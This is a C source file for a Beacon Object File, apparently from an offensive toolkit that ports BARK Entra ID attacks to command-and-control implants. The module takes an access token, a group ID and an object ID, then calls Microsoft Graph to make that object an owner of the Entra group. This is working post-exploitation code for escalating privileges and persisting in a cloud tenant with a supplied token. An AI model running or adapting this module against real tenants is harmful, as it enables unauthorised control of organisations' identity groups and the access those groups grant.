/*
 * new_entra_group_owner.c — BARK BOF
 * New-EntraGroupOwner — Add an owner to an Entra group
 *
 * Args : token, groupId, ownerObjectId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[512], bodyBuf[512];
    LPWSTR widePath = NULL;
    char  *token = NULL, *groupId = NULL, *ownerId = NULL;

    BeaconDataParse(&parser, args, alen);
    token   = BeaconDataExtract(&parser, NULL);
    groupId = BeaconDataExtract(&parser, NULL);
    ownerId = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_new_entra_group_owner <token> <groupId> <ownerObjectId>\n");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"@odata.id\":\"https://graph.microsoft.com/v1.0/directoryObjects/%s\"}", ownerId);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/v1.0/groups/%s/owners/$ref", groupId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] New-EntraGroupOwner\n");
    BarkPost(L"graph.microsoft.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
